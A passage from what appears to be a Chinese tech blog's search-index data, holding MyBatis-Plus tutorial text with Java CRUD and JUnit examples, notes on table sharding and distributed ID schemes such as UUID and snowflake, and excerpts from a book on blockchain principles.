的客户端 支持作为 Hibernate3、Hibernate4、Hibernate5、MyBatis 的二级缓存实现 下篇：MyBatis 使用 J2Cache 作为二级缓存实现 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"MyBatis-Plus 入门教程之二",url:"/posts/3fd3ab84.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 常用注解提示 MyBatis-Plus 3.x 注解类包的源码：👉 mybatis-plus-annotation @TableName 描述：表名注解，标识实体类对应的表 使用位置：实体类 123456789@TableName("sys_user")public class User { private Long id; private String name; private Integer age; private String email;} 属性 类型 必须指定 默认值 描述 value String 否 "" 表名 schema String 否 "" Schema keepGlobalPrefix boolean 否 false 是否保持使用全局的 tablePrefix 的值（当全局 tablePrefix 生效时） resultMap String 否 "" SQL 映射文件中 resultMap 的 id（用于满足特定类型的实体类对象绑定） autoResultMap boolean 否 false 是否自动构建 resultMap 并使用（如果设置 resultMap 则不会进行 resultMap 的自动构建与注入） excludeProperty String[] 否 {} 需要排除的属性名（@since 3.3.1 version） 关于 autoResultMap 的说明 MyBatis-Plus 会自动构建一个 resultMap 并注入到 MyBatis 里（一般用不上），请注意以下内容： 因为 MyBatis-Plus 的底层是 MyBatis，所以 MyBatis-Plus 只是帮开发者注入了常用 CRUD 到 MyBatis 里，注入之前是动态的（根据开发者的 Entity 字段以及注解变化而变化），但是注入之后是静态的（等同于 XML 配置中的内容） 对于 typeHandler 属性，MyBatis 只支持写在两个地方 第一个地方：定义在 resultMap 里，作用于查询结果的封装 第二个地方：定义在 insert 和 update 语句的 #{property} 中的 property 后面（例：#{property, typehandler=xxx.xxx.xxx}），并且只作用于当前 设置值 除了以上两种直接指定 typeHandler 的形式，MyBatis 还支持在全局配置文件中自定义 typeHandler 包的配置，原理是根据开发者的 property 类型去找其对应的 typeHandler 并使用。 @TableId 描述：主键注解 使用位置：实体类主键属性 12345678910@TableName("sys_user")public class User { @TableId private Long id; private String name; private Integer age; private String email;} 属性 类型 必须指定 默认值 描述 value String 否 "" 主键字段名 type Enum 否 IdType.NONE 指定主键类型 IdType 描述：主键类型 值 描述 AUTO 数据库 ID 自增，该类型必须确保数据库表的主键字段设置了 ID 自增，否则无法生效 NONE 无状态，该类型为未设置主键类型（注解里等于跟随全局，全局里约等于 INPUT） INPUT 用户自行设置主键值，该类型可以通过自己注册自动填充插件进行填充 ASSIGN_ID 分配 ID，主键类型为 Number [Long 和 Integer] 或 String（@since 3.3.0 version），使用的是 IdentifierGenerator 接口的 nextId 方法（默认实现类为 DefaultIdentifierGenerator，使用的是雪花算法） ASSIGN_UUID 分配 UUID，主键类型为 String（@since 3.3.0 version），使用的是 IdentifierGenerator 接口的 nextUUID 方法 ID_WORKER 分布式全局唯一 ID 长整型类型（请使用 ASSIGN_ID） UUID 32 位 UUID 字符串（请使用 ASSIGN_UUID） ID_WORKER_STR 分布式全局唯一 ID 字符串类型（请使用 ASSIGN_ID） 注意 1、AUTO 主键类型必须确保数据库表的主键字段设置了 ID 自增，否则无法生效 2、ASSIGN_ID 主键类型（使用雪花算法生成 ID），与数据库表的主键字段是否设置 ID 自增没有任何关系 3、ASSIGN_ID 和 ASSIGN_UUID 这两种主键类型，只有当插入对象的 ID 为空时，才会自动填充主键值 @TableField 描述：字段注解（非主键） 使用位置：实体类非主键属性 1234567891011@TableName("sys_user")public class User { @TableId private Long id; @TableField("nickname") private String name; private Integer age; private String email;} 属性 类型 必须指定 默认值 描述 value String 否 "" 数据库字段名 exist boolean 否 true 是否为数据库表字段 condition String 否 "" 字段 where 实体查询比较条件，有值设置则按设置的值为准，没有则为默认全局的 %s=#{%s} update String 否 "" 字段 update set 部分注入，例如：当在 version 字段上注解 update="%s+1"，表示更新时会 set version=version+1 （该属性优先级高于 el 属性） insertStrategy Enum 否 FieldStrategy.DEFAULT 举例：NOT_NULL insert into table_a(&lt;if test="columnProperty != null"&gt;column&lt;/if&gt;) values (&lt;if test="columnProperty != null"&gt;#{columnProperty}&lt;/if&gt;) updateStrategy Enum 否 FieldStrategy.DEFAULT 举例：IGNORED update table_a set column=#{columnProperty} whereStrategy Enum 否 FieldStrategy.DEFAULT 举例：NOT_EMPTY where &lt;if test="columnProperty != null and columnProperty!=\'\'"&gt;column=#{columnProperty}&lt;/if&gt; fill Enum 否 FieldFill.DEFAULT 字段自动填充策略 select boolean 否 true 是否进行 select 查询 keepGlobalFormat boolean 否 false 是否保持使用全局的 format 进行处理 jdbcType JdbcType 否 JdbcType.UNDEFINED JDBC 类型 (该默认值不代表会按照该值生效) typeHandler Class&lt;? extends TypeHandler&gt; 否 UnknownTypeHandler.class 类型处理器 (该默认值不代表会按照该值生效) numericScale String 否 "" 指定小数点后保留的位数 关于 jdbcType 和 typeHandler 以及 numericScale 的说明 numericScale 只生效于 update 的 SQL 语句 jdbcType 和 typeHandler 如果不配合 @TableName(autoResultMap = true) 一起使用，也只生效于 update 的 SQL 语句 对于 typeHandler，如果你的字段类型和 set 进去的类型为 equals 关系，则只需要让你的 typeHandler 让 Mybatis 加载到即可，不需要使用注解 FieldStrategy字段策略 FieldStrategy 的作用主要是在进行新增、更新时，根据配置的策略判断是否对实体对象的值进行空值判断，如果策略为字段不能为空，则不会对为空的字段进行赋值或更新。同样的，在进行 where 条件查询时，根据 whereStrategy 策略判断是否对字段进行空值判断，如果策略为字段不能为空，则为空的字段不会作为查询条件组装到 where 条件中。 值 描述 IGNORED 忽略判断 NOT_NULL 非 NULL 判断 NOT_EMPTY 非空判断（只对字符串类型字段，其他类型字段依然为非 NULL 判断） DEFAULT 追随全局配置 NEVER 不加入 SQL FieldFill 描述：字段自动填充策略 值 描述 DEFAULT 默认不处理 INSERT 插入时填充字段 UPDATE 更新时填充字段 INSERT_UPDATE 插入和更新时填充字段 @Version 描述：乐观锁注解 使用位置：实体类属性 使用案例：乐观锁插件 @OrderBy 描述：内置 SQL 默认排序规则，优先级低于 wrapper 条件查询 属性 类型 必须指定 默认值 描述 asc boolean 否 false 是否升序查询 isDesc boolean 否 true 是否倒序查询 sort short 否 Short.MAX_VALUE 数字越小越靠前 @EnumValue 描述：普通枚举类注解 使用位置：实体类枚举类型的属性 使用案例：通用枚举 @TableLogic 描述：表字段逻辑处理注解（逻辑删除） 使用场景：数据删除后需要进行数据恢复 物理删除：真实删除，将对应数据从数据库中删除，之后查询不到此条被删除的数据 逻辑删除：假删除，将对应数据中代表是否被删除字段的状态修改为 “被删除状态”，之后在数据库中仍旧能看到此条数据记录 使用案例：逻辑删除 属性 类型 必须指定 默认值 描述 value String 否 “” 逻辑未删除时的值 delval String 否 “” 逻辑删除时的值 @KeySequence 描述：序列主键策略 oracle 属性：value、resultMap 属性 类型 必须指定 默认值 描述 value String 否 “” 序列名 clazz Class 否 Long.class id 的类型，可以指定 String.class，这样返回的 Sequence 值是字符串 1 通用 Mapper CRUD 操作本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-03。 查询数据操作 Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; /** * 根据ID查询 */ @Test public void selectById() { Employee employee = empMapper.selectById(1L); System.out.println(employee); } /** * 根据多个ID查询 */ @Test public void selectBatchIds() { List&lt;Long&gt; ids = Arrays.asList(1L, 2L, 3L); List&lt;Employee&gt; list = empMapper.selectBatchIds(ids); list.forEach(System.out::println); } /** * 根据Map条件查询 */ @Test public void selectByMap() { Map&lt;String, Object&gt; columnMap = new HashMap&lt;String, Object&gt;(); // 查询条件，指定的是表字段的名称，而不是实体类的属性名 columnMap.put("last_name", "Jim"); List&lt;Employee&gt; list = empMapper.selectByMap(columnMap); list.forEach(System.out::println); } /** * 查询所有数据 */ @Test public void selectList() { List&lt;Employee&gt; list = empMapper.selectList(null); list.forEach(System.out::println); }} 删除数据操作 Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 1234567891011121314151617181920212223242526272829303132333435363738@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; /** * 根据ID删除数据 */ @Test public void deleteById() { Integer deleteResult = empMapper.deleteById(2L); System.out.println("deleteResult: " + deleteResult); } /** * 根据多个ID删除数据 */ @Test public void deleteBatchIds() { List&lt;Long&gt; ids = Arrays.asList(2L, 3L); Integer deleteResult = empMapper.deleteBatchIds(ids); System.out.println("deleteResult: " + deleteResult); } /** * 根据Map条件删除数据 */ @Test public void deleteByMap() { Map&lt;String, Object&gt; columnMap = new HashMap&lt;String, Object&gt;(); // 查询条件，指定的是表字段的名称，而不是实体类的属性名 columnMap.put("gender", "0"); Integer deleteResult = empMapper.deleteByMap(columnMap); System.out.println("deleteResult: " + deleteResult); }} 插入数据操作插入数据获取主键值若数据库表使用的是自增主键，MyBatis 支持在插入数据后返回自增的主键值，详细的使用教程可以看 这里。值得一提的是，MyBatis-Plus 在插入数据后会自动将主键值回写到 JavaBean 中，不需要任何配置。示例代码如下： Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 123456789101112131415@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); System.out.println("insert result: " + insertResult); System.out.println(employee); }} 上述代码执行后的结果如下： 12insert result: 1Employee [id=41, lastName=David, gender=1, email=david@gmail.com, age=23] 插入数据进行非空判断MyBatis-Plus 在插入数据的时候，默认会对实体类的每个属性进行非空判断，只有非空的实体类属性会拼接到 SQL 语句中。 实体类 1234567891011public class Employee { private Long id; private String email; private String lastName; private String gender; private Integer age; ...} Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 1234567891011121314151617@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void insert() { Employee employee = new Employee(); employee.setLastName("David"); employee.setEmail("david@gmail.com"); Integer insertResult = empMapper.insert(employee); System.out.println("insertResult: " + insertResult); System.out.println(employee); }} 观察下述的代码执行结果，可以发现只有非空的实体类属性会拼接到 SQL 语句中。 12345==&gt; Preparing: INSERT INTO t_employee ( last_name, email ) VALUES ( ?, ? )==&gt; Parameters: David(String), david@gmail.com(String)&lt;== Updates: 1insertResult: 1Employee [id=44, lastName=David, gender=null, email=david@gmail.com, age=null] 若希望新增操作忽略实体类属性的非空判断，可以在实体类的属性上使用 @TableField 注解，并通过 @TableField 注解的 insertStrategy 参数来指定判断策略。 实体类 1234567891011121314151617public class Employee { private Long id; private String email; private String lastName; @TableField(insertStrategy = FieldStrategy.IGNORED) private String gender; @TableField(insertStrategy = FieldStrategy.IGNORED) private Integer age; ...} 重新执行 Junit 测试代码，观察下述的执行结果，可以发现非空的实体类属性也会拼接到 SQL 语句中。 12345==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )==&gt; Parameters: David(String), null, david@gmail.com(String), null&lt;== Updates: 1insertResult: 1Employee [id=45, lastName=David, gender=null, email=david@gmail.com, age=null] 更新数据操作更新数据进行非空判断MyBatis-Plus 在更新数据的时候，默认会对实体类的每个属性进行非空判断，只有非空的属性才会拼接到 SQL 语句中。 实体类 1234567891011public class Employee { private Long id; private String email; private String lastName; private String gender; private Integer age; ...} Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 1234567891011121314151617@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void update() { Employee employee = new Employee(); employee.setId(1L); employee.setLastName("David"); employee.setEmail("david@gmail.com"); Integer updateReuslt = empMapper.updateById(employee); System.out.println("updateReuslt: " + updateReuslt); }} 观察下述的代码执行结果，可以发现只有非空的实体类属性会拼接到 SQL 语句中。 1234==&gt; Preparing: UPDATE t_employee SET last_name=?, email=? WHERE id=?==&gt; Parameters: David(String), david@gmail.com(String), 1(Long)&lt;== Updates: 1updateReuslt: 1 若希望更新操作忽略实体类属性的非空判断，可以在实体类的属性上使用 @TableField 注解，并通过 @TableField 注解的 updateStrategy 参数来指定判断策略。 实体类 1234567891011121314151617public class Employee { private Long id; private String email; private String lastName; @TableField(updateStrategy = FieldStrategy.IGNORED) private String gender; @TableField(updateStrategy = FieldStrategy.IGNORED) private Integer age; ...} 重新执行 Junit 测试代码，观察下述的执行结果，可以发现非空的实体类属性也会拼接到 SQL 语句中。 1234==&gt; Preparing: UPDATE t_employee SET email=?, last_name=?, gender=?, age=? WHERE id=?==&gt; Parameters: david@gmail.com(String), David(String), null, null, 1(Long)&lt;== Updates: 1updateReuslt: 1 通用 Service CRUD 操作MyBatis-Plus 为通用的 Service CRUD 操作提供了 IService 接口 和 ServiceImpl 实现类，里面封装了常用的 CRUD 方法。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-04。 创建 Service 接口和实现类 Service 接口 123456/** * IEmployeeService 接口继承 IService 接口提供的基础功能 */public interface IEmployeeService extends IService&lt;Employee&gt; {} Service 实现类 1234567/** * EmployeeServiceImpl 类实现了 IEmployeeService 接口，并继承 ServiceImpl 类提供的基础功能 */@Servicepublic class EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements IEmployeeService {} 调用 Service 接口和实现类 Junit 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private IEmployeeService empService; /** * 查询总记录数 */ @Test public void count() { Long count = empService.count(); System.out.println("count: " + count); } /** * 更新数据 */ @Test public void update() { Employee employee = new Employee(); employee.setId(1L); employee.setGender("0"); boolean updateResult = empService.updateById(employee); System.out.println("updateResult: " + updateResult); } /** * 批量插入 */ @Test public void saveBatch() { List&lt;Employee&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) { Employee emp = new Employee(); emp.setAge(26); emp.setGender("1"); emp.setLastName("user-" + i); list.add(emp); } boolean saveResult = this.empService.saveBatch(list); System.out.println("saveResult: " + saveResult); } /** * 删除数据 */ @Test public void delete() { boolean deleteResult = this.empService.removeById(11L); System.out.println("deleteResult: " + deleteResult); }} 数据库扩展介绍在企业开发中，往往需要选择合适的方案去应对数据规模的增长，以应对数据库逐渐增长的访问压力和数据量。数据库的扩展方式主要包括：业务分库、主从复制、数据库分表、数据库分片、数据库分区。 数据库分表将不同业务数据分散存储到不同的数据库服务器，能够支撑百万甚至千万用户规模的业务，但如果业务继续发展，同一业务的单表数据也会达到单台数据库服务器的处理瓶颈。例如，淘宝的几亿用户数据，如果全部存放在一台数据库服务器的一张表中，肯定是无法满足性能要求的，此时就需要对单表数据进行拆分。单表数据拆分有两种方式，包括垂直分表和水平分表。示意图如下: 垂直分表垂直分表适合将表中某些不常用且占了大量空间的列拆分出去。例如，上面示意图中的 nickname 和 description 字段，假设开发一个婚恋网站，用户在筛选其他用户的时候，主要是用 age 和 sex 两个字段进行查询，而 nickname 和 description 两个字段主要用于展示，一般不会在业务查询中用到。description 字段本身又比较占存储空间，因此可以将这两个字段独立到另外一张表中，这样在查询 age 和 sex 时，就能带来一定的性能提升。 水平分表水平分表适合表行数特别大的表，有的公司要求单表行数超过 5000万 就必须进行分表，这个数字可以作为参考，但并不是绝对标准，关键还是要看表的访问性能。对于一些比较复杂的表，可能超过 1000万 就要分表了；而对于一些简单的表，即使存储数据超过 1亿 行，也可以不分表。但不管怎样，当看到表的数据量达到千万级别时，作为架构师就要警觉起来，因为这很可能是架构的性能瓶颈或者隐患。值得一提的是，水平分表相比垂直分表，会引入更多的复杂性，例如要处理全局唯一的数据 ID（分布式唯一全局 ID）。 提示 更多关于分布式唯一全局 ID 的生成方案可以看 这里。 UUIDUUID 按照 OSF 制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片 ID 码和许多可能的数字，并由以下几部分的组成：当前日期和时间、时钟序列、全局唯一的 IEEE 机器识别号。UUID 的标准形式包含 32 个 16 进制的数字，以连字号分为 5 段，形式为 cb6ce510-74fe-4e18-ac3d-05a5c96d3a0f 的 36 个字符。特别注意，基于 MAC 地址生成 UUID 的算法可能会造成 MAC 地址泄露，这个漏洞曾被用于寻找梅丽莎病毒的制作者位置。 适用场景：只要对存储空间没有苛刻要求的都能够适用，比如各种链路追踪、日志存储等。 优点：性能高，本地生成，没有网络消耗。如果只考虑唯一性，那么可以使用。 缺点： 无序：即无法预测 ID 的生成顺序，不能生成递增的有序数字。 ID 长度过长：分布式 ID 一般都是作为主键，但是 MySQL 官方推荐主键尽量越短越好，36 个字符长度的 UUID 不是很推荐。 入库性能差：既然分布式 ID 是主键，然后主键是包含索引的，MySQL 的索引是通过 B+ 树来实现的，每一次新的 UUID 数据的插入，为了查询的优化，都会对索引的底层 B+ 树进行修改。因为 UUID 数据是无序的，所以每一次 UUID 的数据插入都会对主键底层的 B+ 树进行很大的修改，这一点非常不好。插入的 ID 完全无序，不但会导致一些中间节点产生分裂（B+ 树索引分裂），也会白白的创造出很多的不饱和节点，这样大大的降低了数据库的插入性能。 主键自增以最常见的用户 ID 为例，可以按照 1000000 的范围大小进行分段，1 ~ 999999 放到表 1 中，1000000 ~ 1999999 放到表 2 中，以此类推。 复杂点：分段大小的选取。分段太小会导致切分后子表数量过多，增加维护复杂度；分段太大可能会导致单表依然存在性能问题，一般建议分段大小在 100万 至 2000万 之间，具体需要根据业务需求选取合适的分段大小。 优点：可以随着数据的增加平滑地扩充新的表。例如，现在的用户是 100 万，如果增加到 1000 万，只需要增加新的表就可以了，原有的数据不需要动。 缺点：分布不均匀。假如按照 1000 万来进行分表，有可能某个分段实际存储的数据量只有 1 条，而另外一个分段实际存储的数据量有 1000 万条。 取模运算同样以用户 ID 为例，假如一开始就规划了 10 个数据库表，可以简单地用 user_id % 10 的值来表示数据所属的数据库表编号，ID 为 985 的用户放到编号为 5 的子表中，ID 为 10086 的用户放到编号为 6 的子表中。 复杂点：初始表数量的确定。表数量太多维护比较麻烦，表数量太少又可能导致单表性能存在问题。 优点：表分布比较均匀。 缺点：扩充新的表很麻烦，所有表的数据都要重新迁移。 雪花算法雪花算法（SnowFlake）是由 Twitter 公布的分布式主键生成算法，它能够保证不同表的主键的不重复性，以及相同表的主键的有序性。雪花算法的特性是有序、全局唯一、高性能、低延迟（响应时间在 2ms 以内），可在分布式环境（多集群，跨机房）下使用，因此使用雪花算法得到的 ID 是分段组成的： 与指定日期的时间差（毫秒级），41 位，够用 69 年 集群 ID + 机器 ID，一共 10 位，包括 5 位 datacenterId 和 5 位 workerId，最多支持 1024 台机器 序列号，12 位，每台机器每毫秒内最多产生 4096 个序列号 1bit：符号位，固定是 0，表示全部 ID 都是正整数 41bit：时间戳（毫秒数时间差），从指定的日期算起，够用 69 年，用 Long 类型表示的时间戳是从 1970-01-01 00:00:00 开始算起的 10bit：机器 ID，有异地部署，多集群的也可以配置，需要线下规划好各地机房，各集群，各实例 ID 的编号 12bit：序列号，前面都相同的话，最多可以支持到 4096 个 优缺点： 适用场景：分布式应用环境的数据主键 优点： 可以根据自身业务特性分配 bit 位，非常灵活 毫秒数在高位，自增序列在低位，整个 ID 都是趋势递增的 不依赖数据库等三方系统，以服务的方式部署，稳定性更高，生成 ID 的效率也是非常高，低延迟 缺点： 强依赖机器时钟，如果机器的时钟回拨了，会导致生成重复的 ID 若生成环境中使用了容器化技术，实例的个数随时有变化，那么 SnowFlake 算法需要一定的改造才能更好地应用到生产环境中 在单机上是递增的，但是由于涉及到分布式环境，每台机器上的时钟不可能完全同步（如时钟回拨），有时候可能会出现不是全局递增的情况（此缺点可认为无所谓，一般分布式 ID 只是要求趋势递增，并不会严格要求递增，90% 的业务需求都只需要趋势递增） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"《区块链原理、设计与应用》摘录之一",url:"/posts/a548291f.html",text:'区块链核心技术去中心化的技术难关现实生活中常用的纸币具备良好的可转移性，可以相对容易地完成价值的交割。但是对于数字货币来说，数字化内容容易被复制，数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为 “双重支付攻击”。这个时候，就只有实现去中心化 ( de-centralized ) 或多中心化 ( multi-centralized ) 的数字货币系统。要实现一套去中心化的数字货币机制，最关键的是要建立一套可靠的交易记录系统，以及形成一套合理的货币发行机制。在 “去中心化” 的场景下，实现数字货币存在如下几个难题： 货币的防伪：谁来负责对货币的真伪进行鉴定； 货币的交易：如何确保货币从一方安全转移到另外一方； 避免双重支付：如何避免同一份货币支付给多个接收者。 区块链基本原理首先，区块链包括三个基本概念： 交易 (transaction)：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录； 区块 (block)：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识； 链 (chain)：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录。 如果把区块链作为一个状态机，则每次交易就是试图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态改变的结果进行确认。在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加、不允许删除。账本底层的基本结构是一个线性的链表，这也是其名字 “区块链” 的来源。链表由一个个 “区块” 串联组成 (如下图所示)，后继区块记录前导区块的哈希值 ( pre hash )。新的数据要加入，必须放到一个新的区块中。而这个块 (以及块里的交易) 是否合法，可以通过计算哈希值的方式快速检验出来。任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。 以比特币为例理解区块链工作过程以比特币网络为例，可以具体看其中如何使用了区块链技术。首先，比特币客户端发起一项交易，广播到比特币网络中并等待确认。网络中的节点会将一些收到的等待确认的交易记录打包在一起 (此外还要包括前一个区块头部的哈希值等信息)，组成一个候选区块。然后，试图找到一个 nonce 串 (随机串) 放到区块里，使得候选区块的哈希结果满足一定条件 (比如小于某个值)。这个 nonce 串的查找需要一定的时间去进行计算尝试。一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是 “合法” 了，就可以尝试在网络中将它广播出去。其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上。当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认。 当然，在实现上还会有很多额外的细节。这里面比较关键的步骤有两个：一个是完成对一批交易的共识 (创建区块结构)；一个是新的区块添加到区块链结构上，被大家认可，确保未来无法被篡改。比特币的这种基于算力寻找 nonce 串的共识机制称为工作量证明 ( Proof of Work ，PoW )。目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算。尝试的次数越多 (工作量越大)，算出来的概率越大。通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块。算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费 (目前是 12.5 比特币，每四年减半)，这个计算新区块的过程俗称为挖矿。 基于区块链的分布式账本的特点 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改； 去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式； 通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 。 区块链技术的三种典型演化场景 场景 功能 智能合约 一致性 权限 类型 性能 编程语言 代表 公信的数字货币 记账功能 不带有或较弱 PoW 无 公有链 较低 简单脚本 比特币网络 公信的交易处理 智能合约 图灵完备 PoW、PoS 无 公有链 受限 特定语言 以太坊网络 带权限的分布式账本处理 商业处理 多种语言，图灵完备 包括 CFT、 BFT 在内的多种机制，可插拔 支持 联盟链 可扩展 高级编程语言 超级账本 区块链的分类根据参与者的不同，可以分为公开 (public) 链、私有 ( private ) 链和联盟 ( consortium ) 链。 公有链，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的；如果进一步引人许可机制，可以实现私有链和联盟链两种类型； 私有链，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开； 联盟链，介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟。 目前来看，公有链更容易吸引市场和媒体的眼球，但更多的商业价值会在私有链和联盟链上落地。根据使用目的和场景的不同，又可以分为以数字货币为目的的货币链，以记录产权为目的的产权链，以众筹为目的的众筹链等，也有不局限特定应用场景的通用链。现有大部分区块链实现都至少包括了网络层、共识层、智能合约和应用层等结构，联盟链实现往往还会引人一定的权限管理机制。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"区块链"},{title:"MyBatis-Plus 入门教程之一",url:"/posts/ed9df8e6.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言相关资源 MyBatis-Plus GitHub 仓库 MyBatis-Plus 官方 Demo 代码 MyBatis-Plus 2.x 官方中文文档 MyBatis-Plus 3.x 官方中文文档 版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 介绍MyBatis-Plus 是一款非常强大的 MyBatis 增强工具包，只做增强不做改变，为简化开发、提高效率而生。在不用编写任何 SQL 语句的情况下，可以极其方便地实现单一、批量、分页等操作。 MyBatis-Plus 特性特色功能： 无侵入：只做增强不做改变，引入它不会对现有工程产生影响，如丝般顺滑 损耗小：启动即会自动注入基本 CURD，性能基本无损耗，直接面向对象操作 强大的 CRUD 操作：内置通用 Mapper、通用 Service，仅仅通过少量配置即可实现单表大部分 CRUD 操作，更有强大的条件构造器，满足各类使用需求 支持 Lambda 形式调用：通过 Lambda 表达式，方便的编写各类查询条件，无需再担心字段写错 支持主键自动生成：支持多达 4 种主键策略（内置分布式唯一 ID 生成器 - Sequence），可自由配置，完美解决主键问题 支持 ActiveRecord 模式：支持 ActiveRecord 形式调用，实体类只需继承 Model 类即可进行强大的 CRUD 操作 支持自定义全局通用操作：支持全局通用方法注入（ Write once, use anywhere ） 内置代码生成器：采用代码或者 Maven 插件可快速生成 Mapper 、 Model 、 Service 、 Controller 层代码，支持模板引擎，更有超多自定义配置等您来使用 内置分页插件：基于 MyBatis 物理分页，开发者无需关心具体操作，配置好插件之后，写分页等同于普通 List 查询 分页插件支持多种数据库：支持 MySQL、MariaDB、Oracle、DB2、H2、HSQL、SQLite、Postgre、SQLServer 等多种数据库 内置性能分析插件：可输出 SQL 语句以及其执行时间，建议开发测试时启用该功能，能快速揪出慢查询 内置全局拦截插件：提供全表 Delete 、Update 操作智能分析阻断，也可自定义拦截规则，预防误操作 支持数据库： MySQL，Oracle，DB2，H2，HSQL，SQLite，PostgreSQL，SQLServer，Phoenix，Gauss，ClickHouse，Sybase，OceanBase，Firebird，Cubrid，Goldilocks，csiidb 达梦数据库，虚谷数据库，人大金仓数据库，南大通用 (华库) 数据库，南大通用数据库，神通数据库，瀚高数据库 MyBatis-Plus 架构 MyBatis-Plus 生态 MybatisX - 一款全免费且强大的 IDEA 插件，支持跳转、自动补全生成 SQL、代码生成。 Mybatis-Mate - MyBatis-Plus 的企业级模块，支持分库分表、数据审计、字段加密、数据绑定、数据权限、表结构自动生成 SQL 维护等高级特性。 Dynamic-Datasource - 基于 SpringBoot 的多数据源组件，功能强悍，支持 Seata 分布式事务。 Shaun - 基于 Pac4J-JWT 